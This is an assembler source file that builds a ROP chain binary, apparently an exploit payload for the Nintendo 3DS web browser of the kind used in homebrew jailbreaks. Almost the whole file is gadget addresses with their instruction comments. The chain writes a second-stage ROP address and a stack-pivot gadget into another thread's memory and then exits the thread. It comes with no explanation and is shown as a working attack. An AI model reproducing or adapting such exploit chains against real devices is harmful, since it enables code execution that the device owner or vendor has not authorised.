.nds

.create "spider_initial_rop.bin",0x0

; THREAD0ROPLOCATION equ 0x09A6B000
THREAD0ROPLOCATION equ 0x09A6A000
RO_HANDLELOC equ 0x003D8FDC
FS_HANDLELOC equ 0x003D9680

.orga 0x0
	.word 0xDEADBABE
.orga 0x4
	;actual ROP start
	; .word 0x0010322c ; inf loop

	;write thread0 initial rop
		.word 0x003665fc ; pop	{r4, r5, r6, r7, r8, pc}
			.word 0xDEAD0004
			.word 0xDEAD0005
			.word 0xDEAD0006
			.word 0xDEAD0007
			.word 0xDEAD0008

		.word 0x00109d08 ; pop {r4, pc}
			.word 0x0FFFFF0C ; r4

		.word 0x0010c2fc ; pop {r0, pc}
			.word 0x0013035C ; r0 (pop {lr, pc})
		.word 0x00109d04 ; str r0, [r4] | pop {r4, pc}
			.word 0x0FFFFF10 ; r4

		.word 0x0010c2fc ; pop {r0, pc}
			.word THREAD0ROPLOCATION ; r0
		.word 0x00109d04 ; str r0, [r4] | pop {r4, pc}
			.word 0x0FFFFF14 ; r4

		.word 0x0010c2fc ; pop {r0, pc}
			.word 0x00130358 ; r0 (mov sp, lr | pop {lr, pc})
		.word 0x00109d04 ; str r0, [r4] | pop {r4, pc}
			.word 0x0FFFFF0C ; r4

	; ;sleep (if you don't do something like this thread5 never yields to thread0 ?)
	; 	.word 0x0010c2fc ; pop {r0, pc}
	; 		.word 0x10000000 ; r0
	; 	.word 0x00228af4 ; pop {r1, pc}
	; 		.word 0x00000000 ; r1
	; 	.word 0x001041F8 ; svcSleepThread
	.word 0x0012365C ; svcExitThread
	; .word 0x0010322c ; inf loop
	; ;loop
	; 	.word 0x0013035C ; pop {lr, pc}
	; 		.word 0x09A6B000 ; lr
	; 	.word 0x00130358 ; mov sp, lr | pop {lr, pc}

.Close
